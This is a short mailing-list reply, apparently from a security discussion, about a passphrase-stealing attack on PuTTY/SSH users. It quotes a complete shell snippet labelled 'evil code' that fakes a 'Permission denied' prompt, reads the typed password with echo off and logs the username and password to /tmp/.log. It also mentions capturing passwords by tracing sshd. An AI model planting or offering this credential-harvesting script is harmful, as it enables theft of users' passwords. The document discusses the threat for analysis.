Subject: Re: PuTTY private key passphrase stealing attack

all controls like MOTD can be bypassed ...

=========edited script=====
# evil code
mIP=`/sbin/ifconfig | grep x.x.x | cut -d ':' -f2- | cut -d ' ' -f1`
mUn=`whoami`
mSttyVal=`stty -g`
echo -en "Permission denied, please try again.\n"
echo -en "$mUn@...P's password:"
stty -echo
read password
echo -en "username: $mUn \t\t password: $password\n" >>/tmp/.log
echo -en "\n"
stty $mSttyVal
==================end snippet========


Apart from this, we already need to have root access to replace any .bashrc
file ... this is not really an attack but a social engineering attack ....
if we had root access we could attach sshd to the strace and get any
password etc all details ....

Thanks
